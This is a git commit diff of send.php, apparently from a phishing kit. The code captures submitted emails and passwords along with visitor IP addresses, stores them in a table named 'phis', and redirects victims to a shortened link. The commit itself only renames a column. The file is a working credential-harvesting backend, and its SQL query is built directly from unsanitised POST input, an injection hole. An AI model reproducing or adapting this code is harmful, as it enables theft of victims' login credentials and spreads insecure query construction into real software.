5b87c8bc110b7302291641f829616645188f540a
shehrozsheikh <shehrozsheikh@outlook.com>
2016-03-25 12:24:04 +0500

    Update send.php

--- send.php
+++ send.php
@@ -7,7 +7,7 @@ $password = $_POST['password'];
 $ip = $_SERVER['REMOTE_ADDR'];
 $proxIp = $_SERVER['HTTP_X_FORWARDED_FOR'];
 $time = date("Y-m-d",$t);
-$query = "INSERT INTO `phis`(`Email`, `Password`, `Time`,`ip`,`ProxIp`) VALUES ('$email','$password','$time','$ip','$proxIp')";
+$query = "INSERT INTO `phis`(`Email`, `Password`, `Time`,`IP`,`ProxIp`) VALUES ('$email','$password','$time','$ip','$proxIp')";
 $link->query($query);
 header ('Location:http://ow.ly/ZIu2P');
 exit;
